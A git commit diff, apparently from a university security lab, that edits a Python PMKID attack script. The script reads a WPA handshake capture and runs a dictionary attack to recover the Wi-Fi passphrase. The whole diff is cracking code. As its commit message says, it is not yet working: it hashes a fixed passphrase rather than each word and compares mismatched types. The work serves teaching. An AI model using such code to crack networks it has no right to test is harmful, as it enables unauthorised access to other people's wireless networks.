f7ccbd17bcfadb3fadf94462b79529446f7f3ce0
llievre <loic.lievre@heig-vd.ch>
2021-05-02 18:08:16 +0200

    pmk working but compare not working

--- files/pmkid_attack.py
+++ files/pmkid_attack.py
@@ -2,11 +2,10 @@
 # -*- coding: utf-8 -*-
 
 """
-Derive WPA keys from Passphrase and 4-way handshake info
+Compute PMKID from Passphrase and 4-way handshake info
 
-Calcule un MIC d'authentification (le MIC pour la transmission de données
-utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
-sha-1 pour WPA2 ou MD5 pour WPA)
+Calcul des PMKID d'une liste de mots pour les comparer à celui trouvé 
+dans le handshake 1
 """
 
 __author__      = "Abraham Rubinstein et Yann Lederrey | modified By Schranz Guillaume et Lièvre Loïc"
@@ -23,48 +22,37 @@ from numpy import array_split
 from numpy import array
 import hmac, hashlib
 
-def customPRF512(key,A,B):
-    """
-    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
-    """
-    blen = 64
-    i    = 0
-    R    = b''
-    while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
-        i+=1
-        R = R+hmacsha1.digest()
-    return R[:blen]
-
-def getBeacon(pkts):
+def getBeacon(packets):
     """
     Trouve le 1er beacon qui contient un SSID d'une liste de paquet
     """
-    for pkt in pkts:
-        if pkt.type == 0 and pkt.subtype == 8:
-                return pkt
+    for packet in packets:
+        #retourne le premier beacon trouvé
+        if packet.type == 0 and packet.subtype == 8:
+                return packet
 
-def getFirstHandshake(pkts, apMAC):
+def getFirstHandshake(packets, APmac):
     """
     Trouve le 1er Handshake d'une liste de paquets
     à l'aide de la mac de l'AP et du client
     """
-    for pkt in pkts:
-        if pkt.haslayer(EAPOL) and pkt.type == 2 and pkt.subtype == 8:
-            pktSrc = a2b_hex(pkt.addr2.replace(":", ""))
-            if pkt.FCfield == "from-DS" and pktSrc == apMAC:
-                return pkt
+    for packet in packets:
+        if packet.haslayer(EAPOL) and packet.type == 2 and packet.subtype == 8:
+            packetSrc = a2b_hex(packet.addr2.replace(":", ""))
+            #retourne le premier handshake de l'AP trouvé
+            if packet.FCfield == "from-DS" and packetSrc == APmac:
+                return packet
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa=rdpcap("PMKID_handshake.pcap") 
 
-#trouve le beaucon avec le SSID
+#trouve le beacon avec le SSID
 packetBroadcast = getBeacon(wpa)
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
-ssid        = packetBroadcast.info.decode() #on recupere le ssid dans le beacon
+ssid        = packetBroadcast.info #on recupere le ssid dans le beacon
 APmac       = a2b_hex(packetBroadcast.addr2.replace(":", "")) #on recupere la mac de l'ap dans le handshake 1
 packetHS1   = getFirstHandshake(wpa, APmac) #on va chercher le handshake 1
 Clientmac   = a2b_hex(packetHS1.addr1.replace(":", "")) #on recupere la mac du client dans le handshake 1
@@ -73,7 +61,7 @@ pmkid = raw(packetHS1)[-20:-4] #on recupere le pmkid du handshake 1
 print ("\n\nValues used to construct PMKID")
 print ("============================")
 print ("Passphrase: ",passPhrase,"\n")
-print ("SSID: ",ssid,"\n")
+print ("SSID: ",ssid.decode(),"\n")
 print ("AP Mac: ",b2a_hex(APmac),"\n")
 print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
 print ("PMKID: ", b2a_hex(pmkid),"\n")
@@ -90,12 +78,12 @@ for word in fileWords.readlines():
     #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
 
-    wordPMKID = hmac.new(pmk, b"PMK Name" | APmac | Clientmac,hashlib.sha1)
+    wordPMKID = hmac.new(pmk, b"PMK Name" + APmac + Clientmac,hashlib.sha1)
     
     print(wordPMKID)
     print(pmkid)
 
-    #on vérifie sir les deux mic sont egaux
+    #on vérifie si les deux pmkid sont egaux
     if wordPMKID == pmkid:
         print ("Correct passphrase : " + cleanWord)
         print ("=============================")
